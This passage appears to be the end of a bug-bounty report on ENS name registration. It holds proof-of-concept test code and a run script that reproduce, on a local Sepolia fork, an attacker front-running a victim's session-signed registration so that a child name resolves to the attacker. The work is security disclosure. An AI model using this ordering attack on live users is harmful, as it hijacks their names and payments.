        node.type === 'CALL' &&
        isAddressEqual(node.from, hca) &&
        isAddressEqual(node.to, c.ethRegistrar) &&
        node.input.slice(0, 10) === '0xcff3e7c2',
    )
    expect(hcaExecution.output.slice(0, 10)).toBe(NAME_NOT_AVAILABLE)
    expect(innerRegistrarFailure.error).toBe('execution reverted')
    expect(innerRegistrarFailure.output.slice(0, 10)).toBe(NAME_NOT_AVAILABLE)

    const labelId = BigInt(keccak256(stringToHex(LABEL)))
    const [state, registryResolver, subregistry, resolverCode, permissionStillEnabled] =
      await Promise.all([
        publicClient.readContract({
          address: c.ethRegistry,
          abi: registryAbi,
          functionName: 'getState',
          args: [labelId],
        }),
        publicClient.readContract({
          address: c.ethRegistry,
          abi: registryAbi,
          functionName: 'getResolver',
          args: [LABEL],
        }),
        publicClient.readContract({
          address: c.ethRegistry,
          abi: registryAbi,
          functionName: 'getSubregistry',
          args: [LABEL],
        }),
        publicClient.getCode({ address: resolver }),
        publicClient.readContract({
          address: c.hcaOwnerAndSessionValidator,
          abi: validatorAbi,
          functionName: 'isPermissionEnabled',
          args: [hca, permissionId],
        }),
      ])
    expect(state.latestOwner).toBe(owner.address)
    expect(registryResolver).toBe(resolver)
    expect(subregistry).toBe(hostileRegistry)
    expect(resolverCode).toBeUndefined()
    expect(permissionStillEnabled).toBe(true)
    expect(
      await publicClient.readContract({
        address: INTENT_EXECUTOR,
        abi: executorAbi,
        functionName: 'isStandaloneIntentNonceConsumed',
        args: [victimNonce, hca],
      }),
    ).toBe(false)

    const verifier = await verifyHcaRegistrationActor({
      name: `${LABEL}.eth`,
      wallet: owner.address,
      hca,
      publicClient,
    })
    if (verifier.isErr()) throw verifier.error
    expect(verifier.value).toEqual({ verified: true })

    const childName = `pay.${LABEL}.eth`
    const childDns = bytesToHex(packetToBytes(childName))
    const childQuery = encodeFunctionData({
      abi: addrAbi,
      functionName: 'addr',
      args: [namehash(childName)],
    })
    const childResolution = await publicClient.readContract({
      address: UNIVERSAL_RESOLVER,
      abi: universalResolverAbi,
      functionName: 'resolve',
      args: [childDns, childQuery],
    })
    const [childAddress] = decodeAbiParameters(
      [{ type: 'address' }],
      childResolution[0],
    )
    expect(childResolution[1]).toBe(hostileRegistry)
    expect(childAddress).toBe(attacker.address)
    expect(
      await publicClient.readContract({
        address: hostileRegistry,
        abi: hostileRegistryAbi,
        functionName: 'findOwner',
        args: ['pay'],
      }),
    ).toBe(attacker.address)

    const codeHashes: Record<string, Hex> = {}
    for (const [name, address] of Object.entries({
      hcaImplementation: c.standaloneHcaImplementation,
      hcaValidator: c.hcaOwnerAndSessionValidator,
      intentExecutor: INTENT_EXECUTOR,
      registrar: c.ethRegistrar,
      registry: c.ethRegistry,
    })) {
      const code = await publicClient.getCode({ address: address as Address })
      expect(code).toBeDefined()
      codeHashes[name] = keccak256(code!)
    }

    const result = {
      pass: true,
      fork: {
        rpc: RPC,
        pinnedBlock: PINNED_FORK_BLOCK,
        initialBlock: forkStart.number,
        chainId: sepolia.id,
        pinnedTimestamp: forkStart.timestamp,
        codeHashes,
      },
      accountAndSession: {
        accountId: 'ens-standalone-hca.1.1.0',
        owner: owner.address,
        hca,
        sessionKey: session.address,
        permissionId,
        validUntil,
        intentExecutor: INTENT_EXECUTOR,
        gasRefundPaymaster,
        executorInstalled: true,
        firstUseTx: firstUse.hash,
        firstUseFunctionSelector: slice(firstUseOuter.data, 0, 4),
        firstUseNonceConsumed: true,
        enabledBeforeBundle: true,
      },
      managerBuilder: {
        actor: 'submitRevealBatchActor',
        handoffInterceptOnly: true,
        constructionBlock: constructionBlockAfter,
        availableWhenPricedAndBuilt: true,
        quotedPrice: managerPrice,
        calls: managerCalls.map((call) => ({
          to: call.to,
          value: call.value,
          dataHash: keccak256(call.data),
          selector: slice(call.data, 0, 4),
        })),
        registerTuple: {
          label: decodedManagerRegister.args[0],
          owner: decodedManagerRegister.args[1],
          subregistry: decodedManagerRegister.args[3],
          resolver: decodedManagerRegister.args[4],
          duration: decodedManagerRegister.args[5],
          paymentToken: decodedManagerRegister.args[6],
        },
      },
      cleanControl: {
        sameSignedSessionPayload: true,
        transaction: clean.hash,
        status: clean.receipt.status,
        snapshotReverted: true,
      },
      orderedBundle: {
        deterministicPolicy:
          'victim enqueued first; attacker enqueued second with higher tip; Anvil --order fees',
        blockNumber: hostileReceipt.blockNumber,
        hostile: {
          hash: hostileHash!,
          transactionIndex: hostileReceipt.transactionIndex,
          status: hostileReceipt.status,
        },
        victimSession: {
          hash: victimHash!,
          transactionIndex: victimReceipt.transactionIndex,
          status: victimReceipt.status,
          to: INTENT_EXECUTOR,
          functionSelector: slice(victimOuter.data, 0, 4),
          sessionEnvelopeMode: slice(victimOuter.packedSignature, 20, 21),
          exactManagerCallCount: managerCalls.length,
          finalExecutorCallCount: victimExecutions.length,
          revertSelector: returnValue.slice(0, 10),
          revertLabel: unavailableLabel,
          traceReturnDataHash: keccak256(returnValue),
          intentNonceRolledBack: true,
          traceCallPath: [
            {
              depth: 0,
              type: callTrace.type,
              from: callTrace.from,
              to: callTrace.to,
              selector: callTrace.input.slice(0, 10),
              error: callTrace.error,
              revertSelector: callTrace.output.slice(0, 10),
            },
            {
              depth: hcaExecution.depth,
              type: hcaExecution.type,
              from: hcaExecution.from,
              to: hcaExecution.to,
              selector: hcaExecution.input.slice(0, 10),
              error: hcaExecution.error,
              revertSelector: hcaExecution.output.slice(0, 10),
            },
            {
              depth: innerRegistrarFailure.depth,
              type: innerRegistrarFailure.type,
              from: innerRegistrarFailure.from,
              to: innerRegistrarFailure.to,
              selector: innerRegistrarFailure.input.slice(0, 10),
              error: innerRegistrarFailure.error,
              revertSelector: innerRegistrarFailure.output.slice(0, 10),
            },
          ],
        },
      },
      postState: {
        latestOwner: state.latestOwner,
        expectedResolver: registryResolver,
        expectedResolverCodePresent: Boolean(resolverCode),
        hostileSubregistry: subregistry,
        managerVerifier: verifier.value,
        childName,
        childResolver: childResolution[1],
        childAddress,
        sessionStillEnabled: permissionStillEnabled,
      },
      boundary: {
        proved:
          'real deployed Nexus HCA + owner-authorized enabled session + refund-aware IntentExecutor outer execution + real Manager builder + deterministic same-block hostile-first ordering',
        notProved:
          'hosted Rhinestone SDK/orchestrator acceptance, relayer selection, and a production builder choosing this ordering',
      },
    }
    writeFileSync(
      new URL('./result.json', import.meta.url),
      `${JSON.stringify(result, (_, value) =>
        typeof value === 'bigint' ? value.toString() : value, 2)}\n`,
    )
    console.log(
      'LEAD042_BUNDLE_SESSION_E2E',
      JSON.stringify(result, (_, value) =>
        typeof value === 'bigint' ? value.toString() : value),
    )
  })
})
```

Save this as `audit_workspace/renewed/revalidation-2026/lead-042/bundle-session-e2e/run.sh` (SHA-256 `0c8f01c3fcdbcc9da4acb3da7170fa67b3dee6b04dc9c8602f5d7aa5b464575f`):

```sh
#!/usr/bin/env bash
set -euo pipefail

ROOT="$(git rev-parse --show-toplevel)"
BUNDLE="$ROOT/audit_workspace/renewed/revalidation-2026/lead-042/bundle-session-e2e"
UPSTREAM_SEPOLIA_RPC="${UPSTREAM_SEPOLIA_RPC:-https://sepolia.gateway.tenderly.co}"
ANVIL_PORT="${ANVIL_PORT:-$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1", 0)); print(s.getsockname()[1]); s.close()')}"
LOCAL_RPC="http://127.0.0.1:${ANVIL_PORT}"
ANVIL_LOG="$(mktemp -t lead042-anvil.XXXXXX.log)"

anvil \
  --fork-url "$UPSTREAM_SEPOLIA_RPC" \
  --fork-block-number 11685895 \
  --chain-id 11155111 \
  --host 127.0.0.1 \
  --port "$ANVIL_PORT" \
  --order fees \
  --no-rate-limit \
  --quiet >"$ANVIL_LOG" 2>&1 &
ANVIL_PID=$!

cleanup() {
  kill "$ANVIL_PID" 2>/dev/null || true
  wait "$ANVIL_PID" 2>/dev/null || true
  rm -f "$ANVIL_LOG"
}
trap cleanup EXIT INT TERM

for _ in $(seq 1 100); do
  if ! kill -0 "$ANVIL_PID" 2>/dev/null; then
    cat "$ANVIL_LOG" >&2
    exit 1
  fi
  if cast block-number --rpc-url "$LOCAL_RPC" >/dev/null 2>&1; then
    break
  fi
  sleep 0.1
done

if ! kill -0 "$ANVIL_PID" 2>/dev/null; then
  cat "$ANVIL_LOG" >&2
  exit 1
fi
if [[ "$(cast block-number --rpc-url "$LOCAL_RPC")" != "11685895" ]]; then
  echo "fresh pinned fork did not start at block 11685895" >&2
  exit 1
fi

forge build --root "$BUNDLE"
(
  cd "$ROOT/apps/manager"
  ANVIL_RPC="$LOCAL_RPC" node_modules/.bin/vitest run \
    --config ../../audit_workspace/renewed/revalidation-2026/lead-042/bundle-session-e2e/vitest.config.ts \
    ../../audit_workspace/renewed/revalidation-2026/lead-042/bundle-session-e2e/same-block-session-ordering.test.ts
)
```

Run it:

```sh
chmod +x audit_workspace/renewed/revalidation-2026/lead-042/bundle-session-e2e/run.sh
UPSTREAM_SEPOLIA_RPC=https://sepolia.gateway.tenderly.co   audit_workspace/renewed/revalidation-2026/lead-042/bundle-session-e2e/run.sh
```

The script starts and kills its own fresh loopback fork. Expected result:

```
✓ same-block-session-ordering.test.ts (1 test)
  ✓ orders hostile direct registration before the Manager-built session reveal and gets NameNotAvailable
Test Files  1 passed (1)
Tests       1 passed (1)
```

The `LEAD042_BUNDLE_SESSION_E2E` JSON must show: `availableWhenPricedAndBuilt: true`; five Manager calls; clean signed-session status `success`; hostile index `0`/success; victim session index `1`/reverted; outer selector `0xf9225e8b`; inner selector `0xcff3e7c2`; revert selector `0x477707e8`; `intentNonceRolledBack: true`; `managerVerifier.verified: true`; `expectedResolverCodePresent: false`; nonzero `hostileSubregistry`; and the attacker-controlled child address.

### Supporting reproduction Gist

The primary exploit proof above is executable without an unpublished dependency. Because the Immunefi Proof of Concept field is limited to 65,536 characters, the independent supporting proofs are in one **unlisted/secret Gist**:

* exact 4,474-byte public signed Warp/session replay;
* installed SDK `IntentFailedError` through the mounted Manager false-success path;
* adjacent public success/failure raw-transaction replay; and
* read-only production `COMPLETED`/`FAILED` status verification.

**Supporting Gist:** [exact signed-session, Manager, and production-status controls](https://gist.github.com/IronsideSec/61e4683879e240c156555ef952e723e3/289964aa912429c55b792281ed8e8b8690dfe5e4)

**Supporting Gist payload SHA-256:** `55229fd4077626e7aa7cb4ca31ef96f2eb37ceb65987200af0da27c9fc2630ca` (UTF-8 text copied between the Gist markers below, with its final line feed).

The public failed fill in the Gist is the separately identified `CommitmentTooOld` control; it is not represented as the fork-local hostile `NameNotAvailable` failure.
